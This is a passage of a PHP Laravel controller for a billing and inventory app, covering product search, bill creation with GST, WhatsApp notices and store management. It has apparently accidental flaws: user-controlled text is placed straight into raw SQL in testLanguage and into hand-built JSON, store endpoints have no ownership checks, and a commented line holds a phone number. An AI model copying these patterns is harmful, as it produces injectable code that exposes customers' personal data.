                    'message' => Auth::user()->name.' Updated Stock',
                ]);
                $activity->save();

                DB::commit();
                $response = ['success' => true, 'message' => 'Product updated successfully', 'data' => $product];
            }

            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function deleteProduct(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'product_id' => 'required|exists:products,id|numeric',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {

                $product = Product::where('id', $request->product_id)->first();
                $product->destroy($product->id);
                DB::commit();
                $response = ['success' => true, 'message' => 'Product deleted successfully'];
            }

            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    private function getUncategorizedCategoryIdForStore($store_id)
    {
        $store = Store::where('id',$store_id)->first();
        $uncategorizedCategory = Category::where('name', 'Uncategorized')
            ->where('module_id', $store->module_id)
            ->first();

        if (!$uncategorizedCategory) {
            // If "Uncategorized" category doesn't exist for the store module, create it
            $uncategorizedCategory = new Category();
            $uncategorizedCategory->name = 'Uncategorized';
            $uncategorizedCategory->module_id = $store->module_id;
            $uncategorizedCategory->save();
        }

        return $uncategorizedCategory->id;
    }

    public function getProduct(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'store_id' => 'required|numeric',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {
                $products = Product::with('category','productSubCategory','variations')->where('store_id',$request->store_id)->get();
                $lowStock = [];
                $outogstockStock = [];
                foreach($products as $product){
                    $product->variantCount = count($product->variations);

                    if($product->stock <= $product->low_stock){
                        array_push($lowStock,$product);
                    }
                    if($product->stock == 0){
                        array_push($outogstockStock,$product);
                    }

                }

                $billHistories = BillDetail::where('store_id',$request->store_id)->get();
                $itemCounts = [];
                $itemIds = [];

                foreach ($billHistories as $history) {
                    $productDetails = json_decode($history->product_detail, true);
                    if ($productDetails && is_array($productDetails)) {
                        foreach ($productDetails as $item) {
                            if (in_array($item['id'], $itemIds)) {
                            }else{
                                array_push($itemIds,$item['id']);
                            }
                            $itemName = strtolower($item['product_name']);
                            if (isset($itemCounts[$itemName])) {
                                $itemCounts[$itemName]++;
                            } else {
                                $itemCounts[$itemName] = 1;
                            }
                        }
                    }
                }

                $mostSold = Product::with('category','productSubCategory','variations')->where('store_id',$request->store_id)->whereIn('id',$itemIds)->get();

                $response = ['success' => true, 'message' => 'Product detail', 'Product' => $products, 'Low_Stock' => $lowStock , 'Out_of_stock' => $outogstockStock , 'Most_sold' => $mostSold];
            }

            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function searchByBarcodeProduct(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'barcode' => 'required',
                'store_id' => 'numeric',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {

                if($request->store_id)
                {
                    $storeInvertry = Product::with('category')->where('store_id',$request->store_id)->where('status', '1')->where('barcode',$request->barcode)->orwhere('barcode_two', $request->barcode)->get();
                    if(count($storeInvertry) > 0)
                    {
                        return Response::json(['success' => true, 'fromInventory' => true, 'message' => 'Inventory Products detail', 'Product' => $storeInvertry] , 200);
                    }
                }

                // Products check in Centrallib_product
                $centralProducts = CentralLibrary::with('category')->where('status', '1')->where('barcode', $request->barcode)->orwhere('barcode_two', $request->barcode)->get();

                if ($centralProducts->count() > 0) {
                    $response = ['success' => true, 'fromInventory' => false, 'message' => 'Library Product List', 'Product' => $centralProducts];
                } else {
                    $response = ['success' => false, 'message' => 'Products not found, Considered from adding.'];
                }
            }
            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function searchByProductName(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'product_name' => 'required',
                'store_id' => 'numeric',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {
                if($request->store_id)
                {
                    $storeInvertry = Product::with('category')->where('store_id',$request->store_id)->where('status', '1')->where('product_name', 'LIKE', '%'.$request->product_name.'%')->get();

                    if(count($storeInvertry) > 0)
                    {
                        return Response::json(['success' => true, 'fromInventory' => true, 'message' => 'Inventory Products detail', 'Product' => $storeInvertry] , 200);
                    }

                    $storeInvertrybybarcode = Product::with('category')->where('store_id',$request->store_id)->where('status', '1')->where('barcode', $request->product_name)->get();
                    if(count($storeInvertrybybarcode) > 0)
                    {
                        return Response::json(['success' => true, 'fromInventory' => true, 'message' => 'Inventory Products detail', 'Product' => $storeInvertrybybarcode] , 200);
                    }
                }

                // Products check in Centrallib_product
                $centralProducts = CentralLibrary::with('category')->where('status', '1')->where('product_name', 'LIKE', '%'.$request->product_name.'%')->get();
                if (count($centralProducts) > 0) {
                    $response = ['success' => true, 'fromInventory' => false, 'message' => 'Library Product List', 'Product' => $centralProducts];
                } else {
                    $centralProductsByBarcode = CentralLibrary::with('category')->where('status', '1')->where('barcode', $request->product_name)->get();
                    if(count($centralProductsByBarcode) > 0)
                    {
                        $response = ['success' => true, 'fromInventory' => false, 'message' => 'Library Product List', 'Product' => $centralProductsByBarcode];
                    }else{
                        $response = ['success' => false, 'message' => 'Products not found, Considered from adding.'];
                    }
                }
            }
            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function categoryProduct(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'store_id' => 'required|exists:stores,id|numeric',
                'category_id' => 'required|exists:categories,id|numeric',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {

                $categoryProduct = Product::with('category','variations')->where('store_id',$request->store_id)->where('category',$request->category_id)->where('status', '1')->get();
                $response = ['success' => true, 'message' => 'Category Product List', 'Product' => $categoryProduct];
            }
            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function storeProductCategory(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'store_id' => 'required|exists:stores,id|numeric',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {
                $products = Product::where('store_id',$request->store_id)->where('status', '1')->get()->unique('category')->pluck('category')->toarray();
                $category = Category::whereIn('id',$products)->orderBy('created_at','ASC')->get();
                $response = ['success' => true, 'message' => 'Store product category List', 'Category' => $category];
            }
            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function addCustomer(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'customer_name' => 'required|string',
                'whatsapp_no' => 'required|numeric|digits:10|unique:users',
                'customer_address' => 'required|string',
                'role_type' => 'required',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {
                #save image
                $image = $request->image;
                if ($image) {
                    $path  = config('image.profile_image_path_view');
                    $image = CommonController::saveImage($image, $path, 'user');
                }else{
                    $image = null;
                }

                $roleID = Role::where('id',$request->role_type)->first();

                $password = $request->password;
                if($request->password){
                  $password = bcrypt($request->password);
                }
                #add user
                $userAdd = User::create([
                    'user_id'           => Auth::user()->id,
                    'name'              => $request->customer_name,
                    'email'             => $request->email,
                    'password'          => $password,
                    'role_type'         => $roleID->id,
                    'address'           => $request->customer_address,
                    'whatsapp_no'       => $request->whatsapp_no,
                    'image'             => $image,
                    'unique_id'         => CommonController::generate_uuid('users'),
                    'aadhar_number'     => $request->aadhar_number,
                    'driving_licence'   => $request->driving_licence,
                ]);
                #assign role to user
                $userAdd->syncRoles($roleID->id);
                $userAdd->save();

                // $token = $userAdd->createToken('billpe.cloud')->accessToken;

                DB::commit();
                $response = ['success' => true, 'message' => 'Customer added successfully', 'data' => $userAdd];
            }

            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function createBill(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'product_details' => 'required|array',
                'product_details.*.id' => 'required|numeric',
                'product_details.*.product_name' => 'required|string',
                'product_details.*.qtn' => 'required|numeric',
                'product_details.*.price' => 'required|numeric',
                'store_id'=>'required|numeric',
                // 'customer_name' => 'required|string',
                // 'customer_number' => 'required|numeric|digits:10',
                'amount'=>'required|numeric',
                'discount'=>'required|numeric',
                'amount_to_pay'=>'required|numeric',
                'payment_methord'=>'required|string',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {

                $billCount = 1;
                $bill = BillDetail::where('store_id', $request->store_id)->orderBy('created_at','DESC')->first();
                if($bill){
                    $billCount = $bill->bill_number + 1;
                }
                $uniqueId = Str::random(8) . time();

                // $lastBill = BillDetail::where('store_id', $request->store_id)->where('customer_number',$request->customer_number)->orderBy('id', 'DESC')->first();
                // $due_amount = $request->due_amount;
                // $due_date = $request->due_date;

                // if($lastBill){
                //     if($request->payment_methord == 'Lending'){
                //         $due_amount = $request->due_amount + $lastBill->due_amount;
                //     }else{
                //         $due_amount = $lastBill->due_amount;
                //         $due_date = $lastBill->due_date;
                //     }
                // }

                $newBillGenerate = new BillDetail();
                $newBillGenerate->store_id = $request->store_id;
                $newBillGenerate->staff_id = $request->staff_id;
                $newBillGenerate->product_detail = json_encode($request->product_details);
                $newBillGenerate->customer_name = $request->customer_name;
                $newBillGenerate->customer_number = $request->customer_number;
                $newBillGenerate->amount = $request->amount;
                $newBillGenerate->discount = $request->discount;
                $newBillGenerate->total_amount = $request->amount_to_pay;
                $newBillGenerate->payment_methord = $request->payment_methord;
                $newBillGenerate->due_amount = $request->due_amount;
                $newBillGenerate->due_date = $request->due_date;
                $newBillGenerate->unique_id = $uniqueId;
                $newBillGenerate->combined_id = $billCount . $uniqueId;
                $newBillGenerate->bill_number = $billCount;
                $newBillGenerate->is_gst = $request->is_gst;

                $newBillGenerate->GST5 = '0';
                $newBillGenerate->GST12 = '0';
                $newBillGenerate->GST18 = '0';
                $newBillGenerate->GST28 = '0';
                $newBillGenerate->GST5BeforeAmount = '0';
                $newBillGenerate->GST12BeforeAmount = '0';
                $newBillGenerate->GST18BeforeAmount = '0';
                $newBillGenerate->GST28BeforeAmount = '0';
                $newBillGenerate->totalcessAmount = '0';
                $newBillGenerate->totalcessBeforeAmount = '0';

                if($request->staff_id)
                {
                    foreach ($request->product_details as $productDetail) {

                        $product = StockTransfer::with('staffProduct')->where('product_id', $productDetail['id'])->where('staff_id', $request->staff_id)->first();

                        if ($product) {
                            if(isset($productDetail['unit']) && $productDetail['unit'] == 'Pieces')
                            {
                                $totalproductStock = $product->assign_stock*$product->staffProduct->sub_quantity+$product->assign_sub_stock;
                                $availableStock = $totalproductStock-$productDetail['qtn'];
                                $openpack = $availableStock % $product->staffProduct->sub_quantity;

                                //boxAvailable
                                $boxval = $availableStock -  $openpack;
                                $boxaav = $boxval / $product->staffProduct->sub_quantity;

                                $product->assign_stock = $boxaav;
                                $product->assign_sub_stock = $openpack;
                                $product->save();

                            }else{
                                if ((int)$product->assign_stock > 0 && (int) $request->qtn<=(int)$product->assign_stock) {
                                    $product->assign_stock = (int)$product->assign_stock - (int) $productDetail['qtn'];
                                    $product->save();
                                }

                            }
                        }
                    }
                }else {

                    foreach ($request->product_details as $productDetail) {

                        $product = Product::where('id', $productDetail['id'])->first();

                        if($request->is_gst == 1)
                        {
                            if($product->cess){
                                $percentAmount = 100+$product->cess;
                                $cessamount = $productDetail['total_amount']/$percentAmount*$product->cess;
                                $beforAmount = $productDetail['total_amount'] - $cessamount;

                                $newBillGenerate->totalcessAmount = number_format($newBillGenerate->totalcessAmount + $cessamount, 3);
                                $newBillGenerate->totalcessBeforeAmount = number_format($newBillGenerate->totalcessBeforeAmount + $beforAmount, 3);
                            }

                            if($product->gst){
                                $percentAmount = 100+$product->gst;
                                $gstamount = $productDetail['total_amount']/$percentAmount*$product->gst;

                                $beforAmount = $productDetail['total_amount'] - $gstamount;
                            }else{
                                $gstamount = 0;
                            }

                            if($product->gst == 5){
                                $newBillGenerate->GST5 = number_format($newBillGenerate->GST5+$gstamount, 3);
                                $newBillGenerate->GST5BeforeAmount = number_format($newBillGenerate->GST5BeforeAmount+$beforAmount, 3);
                            }else if($product->gst == 12){
                                $newBillGenerate->GST12 = number_format($newBillGenerate->GST12+$gstamount, 3);
                                $newBillGenerate->GST12BeforeAmount = number_format($newBillGenerate->GST12BeforeAmount+$beforAmount, 3);
                            }else if($product->gst == 18){
                                $newBillGenerate->GST18 = number_format($newBillGenerate->GST18+$gstamount, 3);
                                $newBillGenerate->GST18BeforeAmount = number_format($newBillGenerate->GST18BeforeAmount+$beforAmount, 3);
                            }else if($product->gst == 28){
                                $newBillGenerate->GST28 = number_format($newBillGenerate->GST28+$gstamount, 3);
                                $newBillGenerate->GST28BeforeAmount = number_format($newBillGenerate->GST28BeforeAmount+$beforAmount, 3);
                            }
                        }

                        if ($product) {
                            if(isset($productDetail['unit']) && $productDetail['unit'] == 'Pieces')
                            {
                                $totalproductStock = $product->stock*$product->sub_quantity+$product->sub_stock;
                                $availableStock = $totalproductStock-$productDetail['qtn'];
                                $openpack = $availableStock % $product->sub_quantity;
                                //boxAvailable
                                $boxval = $availableStock -  $openpack;
                                $boxaav = $boxval / $product->sub_quantity;

                                $product->stock = $boxaav;
                                $product->sub_stock = $openpack;
                                $product->save();

                            }else{
                                if ((int)$product->stock > 0 && (int) $request->qtn<=(int)$product->stock) {
                                    $product->stock = (int)$product->stock - (int) $productDetail['qtn'];
                                    $product->save();
                                }
                            }
                        }
                    }
                }
                $newBillGenerate->save();

                $store = Store::find($request->store_id);
                $storeOwner = $store->user;

                $newToken = [];
                $checkKot = Kot::where('store_id',$request->store_id)->first();
                if($checkKot)
                {
                    $tokenNumber = 1;

                    if($checkKot->refresh_token == 'Daily')
                    {
                        $tokenNumber = 1;
                        $checkLastToken = BillToken::where('store_id',$request->store_id)->whereDate('created_at', date('Y-m-d'))->orderBy('created_at', 'DESC')->first();
                        if($checkLastToken)
                        {
                            $tokenNumber = $checkLastToken->token_no + 1;
                        }
                    }
                    if($checkKot->refresh_token == 'Weekly')
                    {
                        if(Carbon::now()->englishDayOfWeek == 'Monday')
                        {
                            $tokenNumber = 1;
                            $checkLastToken = BillToken::where('store_id',$request->store_id)->whereDate('created_at', date('Y-m-d'))->orderBy('created_at', 'DESC')->first();
                            if($checkLastToken)
                            {
                                $tokenNumber = $checkLastToken->token_no + 1;
                            }
                        }else{
                            $checkLastToken = BillToken::where('store_id',$request->store_id)->whereDate('created_at', date('Y-m-d'))->orderBy('created_at', 'DESC')->first();
                            if($checkLastToken)
                            {
                                $tokenNumber = $checkLastToken->token_no + 1;
                            }
                        }
                    }

                    if($checkKot->refresh_token == 'Monthly')
                    {
                        if(date('d') == '01')
                        {
                            $tokenNumber = 1;
                            $checkLastToken = BillToken::where('store_id',$request->store_id)->whereDate('created_at', date('Y-m-d'))->orderBy('created_at', 'DESC')->first();
                            if($checkLastToken)
                            {
                                $tokenNumber = $checkLastToken->token_no + 1;
                            }
                        }else{
                            $checkLastToken = BillToken::where('store_id',$request->store_id)->whereDate('created_at', date('Y-m-d'))->orderBy('created_at', 'DESC')->first();
                            if($checkLastToken)
                            {
                                $tokenNumber = $checkLastToken->token_no + 1;
                            }
                        }
                    }
                    if($checkKot->refresh_token == 'NEVER')
                    {
                        $checkLastToken = BillToken::where('store_id',$request->store_id)->orderBy('created_at', 'DESC')->first();
                        if($checkLastToken)
                        {
                            $tokenNumber = $checkLastToken->token_no + 1;
                        }
                    }

                    $newToken = new BillToken();
                    $newToken->store_id = $request->store_id;
                    $newToken->bill_id = $newBillGenerate->id;
                    $newToken->token_no = $tokenNumber;
                    $newToken->order_type = $request->order_type;
                    $newToken->order_details = json_encode($request->product_details);
                    $newToken->save();
                }


                if($storeOwner->device_token){
                    $billCount = BillDetail::where('store_id', $request->store_id)->count();
                    if($billCount == 1){
                        $postdata = '{
                            "to" : "'.$storeOwner->device_token.'",
                            "notification" : {
                                "body" : "Congratulation Apke Pehle Bill Ka shagun aa gya hai!",
                                "title": "First Bill"
                            },
                            "data" : {
                                "type": "Reports"
                            },
                            }';
                        $sendNotification = \App\Helpers\Notification::send($postdata);
                    }
                }

                if($request->due_amount && $request->due_amount > 0)
                {
                    $store = Store::with('user')->where('id',$request->store_id)->first();
                    $phone = '91'.$request->customer_number;
                    $postdata = '{
                        "messaging_product": "whatsapp",
                        "to" : "'.$phone.'",
                        "type": "template",
                        "template": {
                            "name": "customer_lending_bill_created",
                            "language": {"code": "hi"},
                            "components": [
                                {
                                    "type": "header",
                                    "parameters": [
                                        {
                                            "type": "text",
                                            "text": "'.$request->due_amount.'"
                                        }
                                    ]
                                },
                                {
                                    "type": "body",
                                    "parameters": [
                                        {
                                            "type": "text",
                                            "text": "'.$request->customer_name.'"
                                        },
                                        {
                                            "type": "text",
                                            "text": "'.$store->shop_name.'"
                                        },
                                        {
                                            "type": "text",
                                            "text": "'.$request->amount.'"
                                        },
                                        {
                                            "type": "text",
                                            "text": "'.$request->due_amount.'"
                                        },
                                        {
                                            "type": "text",
                                            "text": "'.$request->due_date.'"
                                        },
                                        {
                                            "type": "text",
                                            "text": "'.$store->user->whatsapp_no.'"
                                        }
                                    ]
                                },
                                {
                                    "type": "button",
                                    "sub_type": "url",
                                    "index": "0",
                                    "parameters": [
                                    {
                                        "type": "payload",
                                        "payload": "invoice/'.$request->store_id.'/'.$newBillGenerate->combined_id.'"
                                    }
                                    ]
                                }
                            ]
                        }
                    }';

                    $sendOtpResponse = CommonController::sendWhatsappOtp($postdata);
                }

                $activity = AppActivity::create([
                    'action'  => 'New Bill',
                    'message' => Auth::user()->name.' Created New Bill',
                ]);
                $activity->save();

                // print_r(Auth::user()); die;

                DB::commit();

                // $newBillGenerate->GST5 = number_format($GST5, 2);

                $response = ['success' => true, 'message' => 'Bill created successfully', 'data' => $newBillGenerate, 'token' => $newToken];
            }

            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    //language text change
        public function testLanguage(Request $request, $language = 'en')
        {
            $testing = Testing::select([
                "*",
                DB::raw("CASE
                    WHEN JSON_EXTRACT(name, '$.$language') IS NOT NULL THEN JSON_UNQUOTE(JSON_EXTRACT(name, '$.$language')) ELSE '' END AS name"),
                DB::raw("CASE
                    WHEN JSON_EXTRACT(discription, '$.$language') IS NOT NULL THEN JSON_UNQUOTE(JSON_EXTRACT(discription, '$.$language')) ELSE '' END AS discription"),
            ])->get();

            if (count($testing) == 0) {
                return ['status' => 0, 'message' => "Record not found"];
            }

            return ['status' => 1, 'data' => $testing];
        }

        public function addTestingData(Request $request,$language = 'en')
        {
            $validator = Validator::make($request->all(), [
                'name' => 'required|unique:testings,name,null,id',
                'description' => 'required',
            ]);

            if ($validator->fails()) {
                return response()->json(['status' => false, 'error' => $validator->errors()]);
            }

            // Translate the category name and description and create data arrays
            $name = $request->name;
            $description = $request->description;
            $languages = DB::table("languages")->get();
            $tr = new GoogleTranslate();
            $tr->setSource($language); // Change to the appropriate source language if needed

            $nameData = [];
            $descriptionData = [];

            foreach ($languages as $language) {
                $targetLanguage = $language->code;
                $nameTranslation = $tr->setTarget($targetLanguage)->translate($name);
                $descriptionTranslation = $tr->setTarget($targetLanguage)->translate($description);
                $nameData[$targetLanguage] = $nameTranslation;
                $descriptionData[$targetLanguage] = $descriptionTranslation;
            }

            // Create and save the testing data with translated names and descriptions
            $testing = new Testing();
            $testing->name = json_encode($nameData);
            $testing->discription = json_encode($descriptionData);
            $testing->save();

            if ($testing) {
                return response()->json(['status' => true, 'message' => 'Testing language created successfully']);
            } else {
                return response()->json(['status' => false, 'message' => 'Testing creation failed']);
            }
        }
    //


    public function sendBillToWhatsapp(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'customer_name' => 'required|string',
                'customer_number' => 'required|numeric|digits:10',
                'bill_id' => 'required|numeric',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {

                $checkCustomer = User::where('whatsapp_no',$request->customer_number)->where('role_type',4)->first();
                if($checkCustomer){
                    $checkBill = BillDetail::with('store')->where('id',$request->bill_id)->where('customer_number',$request->customer_number)->first();
                    if($checkBill){
                        $invoiceUrl = url('invoice/'.$checkBill->store_id. '/' . $checkBill->combined_id);

                        // $whatsappSendURL = 'https://web.whatsapp.com/send?phone=918077013392&text=https://admin.billpe.co.in/invoice/71/3895qVmm3ecI1710308178%0AHi!%20amit%0AInvoice%20Amount:%20%E2%82%B9280%0Amystore%0A7894561234%0AThanks%20you!%20Visit%20Again%0APowered%20by%20BillPe';

                        $whatsappSendURL = 'https://api.whatsapp.com/send?phone=91'.$request->customer_number.'&text='.$invoiceUrl.'%0AHi!%20'.str_replace(' ', '%20', $checkCustomer->name).'%0AInvoice%20Amount:%20'.$checkBill->total_amount.'%0A'.str_replace(' ', '%20', $checkBill->store->shop_name).'%0A'.$checkBill->store->user->whatsapp_no.'%0AThanks%20you!%20Visit%20Again%0APowered%20by%20BillPe';

                        $response = ['success' => true, 'message' => 'Whatsapp Bill.', 'whatsapp url' => $whatsappSendURL];
                    }else{
                        return response()->json(['success' => false, 'message' => 'The bill id is not valid.']);
                    }
                }else{
                    return response()->json(['success' => false, 'message' => 'Customer not found from this phone number.']);
                }
                DB::commit();
            }

            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function profile()
    {
        try {
            $user = Auth::user();
            if(!$user->referral_code)
            {
                $referralCode = substr($user->name, 0, 4).rand(10000, 99999);
                $user->referral_code = $referralCode;
                $user->save();
            }
            $store = Store::with('type','module','package')->where('user_id',$user->id)->first();
            $Allstore = Store::with('type','module','package')->where('user_id',$user->id)->get();
            $bank_detail  = Verifications::where('user_id',$user->id)->first();
            $response = ['success' => true, 'message' => 'User Profile', 'user' => $user, 'store' => $store, 'All_store' => $Allstore , 'bank_detail' => $bank_detail];

            return Response::json($response, 200);

        } catch (Exception $e) {
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function updatePackage(Request $request)
    {
        try {
            $rules = [
                'store_id' => 'required|numeric',
                'package_id' => 'required|numeric',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {

                $package = SubscriptionPackage::where('id',$request->package_id)->first();
                $validdate = date('Y-m-d',strtotime(''.$package->validity_days.' days'));
                // print_r($validdate); die;
                $store = Store::where('id',$request->store_id)->first();
                $store->package_id = $package->id;
                $store->package_active_date = date('Y-m-d');
                $store->package_valid_date = $validdate;
                $store->package_amount = $package->subscription_price;
                $store->package_status = $package->status;
                $store->save();

                $activity = AppActivity::create([
                    'action'  => 'Upgrade Plan',
                    'message' => Auth::user()->name.' upgraded to '.$package->name.'',
                ]);
                $activity->save();

                $response = ['success' => true, 'message' => 'Package Updated Successfully.', 'store' => $store];

                DB::commit();
            }

            return Response::json($response, 200);

        } catch (Exception $e) {
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function createWholesaleBill(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'product_details' => 'required|array',
                'product_details.*.id' => 'required|numeric',
                'product_details.*.product_name' => 'required|string',
                'product_details.*.qtn' => 'required|numeric',
                'product_details.*.price' => 'required|numeric',
                'store_id'=>'required|numeric',
                'wholeseller_name' => 'required|string',
                'wholeseller_number' => 'required|numeric|digits:10',
                'amount'=>'required|numeric',
                'discount'=>'required|numeric',
                'total_amount'=>'required|numeric',
                'payment_methord'=>'required|string',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {

                $billCount = WholesellerBillcreate::where('store_id', $request->store_id)->count();
                $uniqueId = Str::random(8) . time();

                $newBillGenerate = new WholesellerBillcreate();
                $newBillGenerate->store_id = $request->store_id;
                $newBillGenerate->product_detail = json_encode($request->product_details);
                $newBillGenerate->wholeseller_name = $request->wholeseller_name;
                $newBillGenerate->wholeseller_number = $request->wholeseller_number;
                $newBillGenerate->amount = $request->amount;
                $newBillGenerate->discount = $request->discount;
                $newBillGenerate->total_amount = $request->total_amount;
                $newBillGenerate->payment_methord = $request->payment_methord;
                $newBillGenerate->due_amount = $request->due_amount;
                $newBillGenerate->due_date = $request->due_date;
                $newBillGenerate->unique_id = $uniqueId;
                $newBillGenerate->combined_id = $billCount + 1 . $uniqueId;
                $newBillGenerate->bill_number = $billCount + 1;
                $newBillGenerate->save();

                foreach ($request->product_details as $productDetail) {

                    $product = Product::where('id', $productDetail['id'])->first();

                    if ($product) {
                        if ((int)$product->stock > 0 && (int) $request->qtn<=(int)$product->stock) {
                            $product->stock = (int)$product->stock + (int) $productDetail['qtn'];
                            $product->save();
                        }
                    }
                }

                DB::commit();
                $response = ['success' => true, 'message' => 'Wholeseller Bill created successfully', 'data' => $newBillGenerate];
            }

            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function addStore(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'store_type' => 'required|numeric',
                'store_category' => 'required|numeric',
                'shop_name' => 'required',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {

                #save image
                $store_image = $request->store_image;
                if ($store_image) {
                    $path  = config('image.profile_image_path_view');
                    $store_image = CommonController::saveImage($store_image, $path , 'store');
                }else{
                    $store_image = null;
                }

                //get package
                $package = SubscriptionPackage::where('id',1)->first();
                $validdate = date('Y-m-d',strtotime(''.$package->validity_days.' days'));

                $storeAdd = Store::create([
                    'user_id'               => Auth::user()->id,
                    'store_type'            => $request->store_type,
                    'module_id'             => $request->store_category,
                    'store_image'           => $store_image,
                    'shop_name'             => $request->shop_name,
                    'latitude'              => $request->latitude,
                    'longitude'             => $request->longitude,
                    'address'               => $request->address,
                    'pincode'               => $request->pincode,
                    'city'                  => $request->city,
                    'gst'                   => $request->gst,
                    'owner_name'            => $request->owner_name,
                    'package_id'            => $package->id,
                    'package_active_date'   => date('Y-m-d'),
                    'package_valid_date'    => $validdate,
                    'package_amount'        => $package->subscription_price,
                    'package_status'        => $package->status,
                ]);

                $storeAdd->save();

                $activity = AppActivity::create([
                    'action'  => 'Add Another Store',
                    'message' => Auth::user()->name.' Created New Store '.$request->shop_name.'',
                ]);
                $activity->save();

                DB::commit();
                $response = ['success' => true, 'message' => 'Store added successfully', 'store' => $storeAdd];
            }

            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function editStore(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'store_id' => 'required|numeric',
                'store_type' => 'required|numeric',
                'store_category' => 'required|numeric',
                'shop_name' => 'required',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {

                $store = Store::where('id', $request->store_id)->first();
                #save image
                $store_image = $request->store_image;
                if ($store_image) {
                    $path  = config('image.profile_image_path_view');
                    $store_image = CommonController::saveImage($store_image, $path , 'store');
                }else{
                    $store_image = $store->store_image;
                }

                $store->store_type = $request->store_type;
                $store->module_id = $request->store_category;
                $store->store_image = $store_image;
                $store->shop_name = $request->shop_name;
                $store->latitude = $request->latitude;
                $store->longitude = $request->longitude;
                $store->address = $request->address;
                $store->pincode = $request->pincode;
                $store->city = $request->city;
                $store->gst = $request->gst;
                $store->owner_name = $request->owner_name;
                $store->save();

                $activity = AppActivity::create([
                    'action'  => 'Update Store',
                    'message' => Auth::user()->name.' Update Store '.$request->shop_name.'',
                ]);
                $activity->save();

                DB::commit();
                $response = ['success' => true, 'message' => 'Store updated successfully', 'store' => $store];
            }

            return Response::json($response, 200);
        } catch (Exception $e) {
            DB::rollBack();
            return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
        }
    }

    public function changeStoreStatus(Request $request)
    {
        DB::beginTransaction();
        try {
            $rules = [
                'store_id' => 'required|numeric',
                'store_status' => 'required',
                'video_time' => 'required',
            ];

            $requestData = $request->all();
            $validator = Validator::make($requestData, $rules);

            if ($validator->fails()) {
                $response = ['success' => false, 'message' => $validator->errors()->all()];
            } else {

                $store = Store::where('id', $request->store_id)->first();
                $store->store_status = $request->store_status;
